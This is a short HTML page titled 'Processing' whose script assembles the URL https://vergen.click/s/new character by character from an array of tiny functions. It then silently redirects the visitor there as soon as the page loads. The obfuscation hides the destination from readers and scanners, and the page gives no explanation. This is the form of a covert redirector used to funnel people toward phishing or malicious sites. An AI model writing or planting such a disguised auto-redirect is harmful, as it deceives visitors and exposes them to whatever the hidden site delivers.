<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            _ => 'h',
            () => 't',
            () => 't',
            function() { return 'p'; },
            () => 's',
            _ => ':',
            function() { return '/'; },
            _ => '/',
            function() { return 'v'; },
            _ => 'e',
            function() { return 'r'; },
            _ => 'g',
            () => 'e',
            _ => 'n',
            () => '.',
            _ => 'c',
            () => 'l',
            function() { return 'i'; },
            _ => 'c',
            function() { return 'k'; },
            _ => '/',
            function() { return 's'; },
            function() { return '/'; },
            _ => 'n',
            function() { return 'e'; },
            _ => 'w'
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>

</body>
</html>
